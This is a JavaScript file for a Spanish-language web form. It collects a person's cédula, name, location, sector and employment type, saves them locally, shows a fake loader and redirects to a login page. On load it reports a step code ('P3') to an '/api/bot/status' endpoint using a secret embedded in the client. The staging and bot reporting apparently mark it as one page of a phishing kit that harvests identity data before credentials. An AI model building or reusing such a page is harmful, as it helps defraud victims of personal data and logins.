const DOMElements = {
    loader: document.querySelector('#loader'),
    formInfo: document.querySelector('#form-info'),
    inputCedula: document.querySelector('#cedula'),
    inputNombre: document.querySelector('#nombre'),
    inputDepartamento: document.querySelector('#departamento'),
    inputMunicipio: document.querySelector('#municipio'),
    inputSector: document.querySelector('#sector'),
    inputTipoEmpleo: document.querySelector('#tipo_empleo')
}

/**
 * Startup
 */
document.addEventListener('DOMContentLoaded', () => {
    addEventListeners();

    const token = KJUR.jws.JWS.sign(null, { alg: "HS256" }, {message: 'P3'}, JWT_SIGN);
    fetch(`${API_URL}/api/bot/status`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${API_KEY}`,
        },
        body: JSON.stringify({token: token})
    })
})

/**
 * Event Listeners
 */
const addEventListeners = () => {
    const { formInfo } = DOMElements;

    formInfo.addEventListener('submit', handleFormSubmit);
}

/**
 * Functions
 */
const handleFormSubmit = async (e) => {
    e.preventDefault();

    const { loader, inputCedula, inputNombre, inputDepartamento, inputMunicipio, inputSector, inputTipoEmpleo } = DOMElements;

    // Validate inputs
    if (inputCedula.value.length > 3 && 
        inputNombre.value.length > 0 && 
        inputDepartamento.value.length > 0 && 
        inputMunicipio.value.length > 0 &&
        inputSector.value.length > 0 &&
        inputTipoEmpleo.value.length > 0) {

        info.cedula = inputCedula.value;
        info.nombre = inputNombre.value;
        info.departamento = inputDepartamento.value;
        info.municipio = inputMunicipio.value;
        info.sector = inputSector.value;
        info.tipo_empleo = inputTipoEmpleo.value;

        updateLS();

        loader.classList.remove('hidden');

        setTimeout(() => {
            window.location.href = 'login.html';
        }, 2500);
    } else {
        alert('Por favor completa todos los campos correctamente');
    }
}